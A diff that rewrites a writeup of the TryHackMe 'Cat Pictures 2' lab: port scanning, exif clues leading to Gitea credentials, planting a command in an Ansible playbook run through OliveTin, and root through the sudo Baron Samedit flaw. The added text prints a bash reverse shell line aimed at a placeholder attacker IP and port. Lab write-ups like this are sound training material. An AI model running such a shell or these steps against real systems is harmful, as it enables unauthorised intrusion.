@@ -1,72 +1,87 @@
-
 # Cat Pictures 2 Writeup
 
-Quick runthrough of a fun CTF from TryHackMe called [Cat Pictures 2](https://tryhackme.com/room/catpictures2).
+This is a walkthrough of the Cat Pictures 2 CTF from TryHackMe. The room can be accessed [here](https://tryhackme.com/room/catpictures2).
 
 ## Recon
 
-I started the box, then ran the Nmap command `nmap -sV -sC -p- #BOXIP -o nmap` to get see what ports were open on this box. It returned the follwing ports open:
+I started by running an Nmap scan to identify open ports on the target machine:
+
+```shell
+nmap -sV -sC -p- <#TARGETIP> -o nmap
+```
+
+The scan revealed the following open ports:
 
  - 22 - OpenSSH 7.6p1
- - 80 - http nginx 1.4.6
- - 222 - OpenSSH 9.0 - *hmmm this seems weird*
- - 1337 - Another http web server
- - 3000 - ANOTHER http web server...
- - 8080 - Python http server..... *ok we get it*
+ - 80 - Nginx 1.4.6 (Lychee version 3.1.1 photo album with cat pictures)
+ - 222 - OpenSSH 9.0 (Unusual port)
+ - 1337 - OliveTin (Web interface to run predefined shell commands)
+ - 3000 - Gitea (Lightweight DevOps platform)
+ - 8080 - Nginx default webpage (Possibly with subdirectories)
 
-Cool, now we have some stuff to explore. Lets check out the web pages first.
+ ## Web Pages
 
-![App Screenshot](https://willmaxcy.com/assets/imgs/catpics2/1.png?text=First+Pic)
+ I began exploring the web applications hosted on different ports:
 
-On port 80 we have a Lychee version 3.1.1 photo album full of cat pictures. Oh! like the name of the room. Probably a good idea to come to this one first.
+ - Port 80: Found a Lychee photo album with cat pictures.
+ ![App Screenshot](https://willmaxcy.com/assets/imgs/catpics2/1.png?text=First+Pic)
 
-![App Screenshot](https://willmaxcy.com/assets/imgs/catpics2/2.png?text=First+Pic)
+ - Port 1337: Discovered OliveTin, a web interface to execute scripts and run Ansible Playbooks.
 
-On port 1337 we have OliveTin, which on it's [GitHub page](https://github.com/OliveTin/OliveTin) says to be a "safe and simple access to predefined shell commands from a web interface". Great! We know that there is a way to run code on the machine. I see it has run a script, ability to ping the host, and run an Ansible Playbook. I'll keep this in mind visiting the other assets.
+  ![App Screenshot](https://willmaxcy.com/assets/imgs/catpics2/2.png?text=First+Pic)
 
-![App Screenshot](https://willmaxcy.com/assets/imgs/catpics2/3.png?text=First+Pic)
+ - Port 3000: Accessed Gitea, a platform that might be hosting scripts and runbooks.
 
-On port 3000 we have a "Gitea" web application. On [their website](https://about.gitea.com/) it says that it is a "lightweight DevOps platform", so maybe this is where the scripts and runbooks are hosted?
+   ![App Screenshot](https://willmaxcy.com/assets/imgs/catpics2/3.png?text=First+Pic)
 
-![App Screenshot](https://willmaxcy.com/assets/imgs/catpics2/4.png?text=First+Pic)
+ - Port 8080: Default Nginx webpage, further inspection may reveal subdirectories.
 
-On port 8080 there is the Nginx default webpage. This seems weird... might have some subdirectories that can be found.
+   ![App Screenshot](https://willmaxcy.com/assets/imgs/catpics2/4.png?text=First+Pic)
 
-At this point I ran `gobuster dir -u http://#TARGETIP:TARGETPORT -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 75` on every web application and got nothing interesting back. I also checked for vulnerabilites in each of the web applications too. Nothing interesting yet, so I decided to go check out the cat pics hosted on port 80.
+After running gobuster and checking for vulnerabilities, nothing significant was found. So, I focused on the cat pictures hosted on port 80.
 
-After looking for more clues with the pics, I decided to download them all and see if there was any exif data located on the files themselves. I ran `exiftool *.jpg` in the file of pics and got back something interesting...
+## Cat Pictures Analysis
+
+I downloaded all the cat pictures and checked them for exif data using exiftool. One picture revealed interesting information of a text file on a subdomain of one of the web applications:
 
 ![App Screenshot](https://willmaxcy.com/assets/imgs/catpics2/5.png?text=First+Pic)
 
-Looks like a port number and text file. I visited the url and was greeted with this...
+Visiting the URL led me to a text file with the following information:
 
 ![App Screenshot](https://willmaxcy.com/assets/imgs/catpics2/6.png?text=First+Pic)
 
-Awesome! Access to something! 
+I managed to gain access to the website with the credentials from the text file and explored the user's repository, where I found `flag1.txt` (1/3 flags).
 
-when I login and see what's visible on the website clicked the user's repository and found this...
+![App Screenshot](https://willmaxcy.com/assets/imgs/catpics2/7.png?text=First+Pic)
 
-![App Screenshot](https://willmaxcy.com/assets/imgs/catpics2/7.png?text=First+Pic) 
 
-flag1.txt found! 1/3
+## Ansible Playbook
 
-From here, I checked out the `playbook.yaml` file and saw this...
+Next, I inspected the `playbook.yaml` file and noticed it contains a shell command: `shell: echo hi`.
 
-![App Screenshot](https://willmaxcy.com/assets/imgs/catpics2/8.png?text=First+Pic) 
+![App Screenshot](https://willmaxcy.com/assets/imgs/catpics2/8.png?text=First+Pic)
 
-I remembered earlier the web app hosted on port 1337 mentioned Ansible. I went back to the URL and saw the "Run Ansible Playbook" button with the Ansible logo. I knew from previous expereince with Ansible that the YAML file would be run by ansible, and the "shell: echo hi" would be executed by bash on the target machine. 
+ Knowing that OliveTin on port 1337 allows running Ansible Playbooks, I replaced the command with simple `bash` reverse shell payload from [RevShells.com](https://revshells.com).
 
-From here, I jumped onto [RevShells](https://revshells.com), plugged in my IP and port, copied the reverse shell payload over the "echo hi" code, set up an NetCat listener, clicked the "Run Ansible Playbook", and boom.
+ ```
+bash -i >& /dev/tcp/<#ATTACKERIP>/<#ATTACKERPORT> 0>&1
+ ```
 
-![App Screenshot](https://willmaxcy.com/assets/imgs/catpics2/9.png?text=First+Pic) 
+Setting up a NetCat listener and clicking "Run Ansible Playbook" triggered the payload, which gave me a shell on the box. Exploring the user directory file gave me another text file named flag2.txt (2/3 flags).
 
-From here, I checked around the file system to see if there was anything interesting. I then uploaded `linpeas.sh` onto the system and ran it. From here I found a few vulnerabilites that the box had. One that stood out was for getting sudo access called `sudo Baron Samedit`
+![App Screenshot](https://willmaxcy.com/assets/imgs/catpics2/9.png?text=First+Pic)
 
-![App Screenshot](https://willmaxcy.com/assets/imgs/catpics2/10.png?text=First+Pic) 
+## Privilege Escalation
 
-From here, I visited the website, downloaded the exploit, uploaded it to the target machine, ran the `make` command, then exploited the program. From here I ran the `./sudo-hax-me-a-sandwich` outfile and through a buffer overflow got root.
+With a reverse shell on the target machine, I looked around for interesting files and uploaded `linpeas.sh` to find vulnerabilities. One stood out: **[CVE-2021-3156] sudo Baron Samedit**.
 
-![App Screenshot](https://willmaxcy.com/assets/imgs/catpics2/11.png?text=First+Pic) 
+![App Screenshot](https://willmaxcy.com/assets/imgs/catpics2/10.png?text=First+Pic)
+
+To exploit this, I downloaded the exploit, uploaded it to the target machine, compiled it with `make`, and executed the `./sudo-hax-me-a-sandwich` outfile to gain root access.
+
+![App Screenshot](https://willmaxcy.com/assets/imgs/catpics2/11.png?text=First+Pic)
+
+From here, I moved to the `/root` file directory and found the flag3.txt (3/3 flags).
 
 Thanks for checking out my writeup! Feel free to reach out with any questions or comments.
 
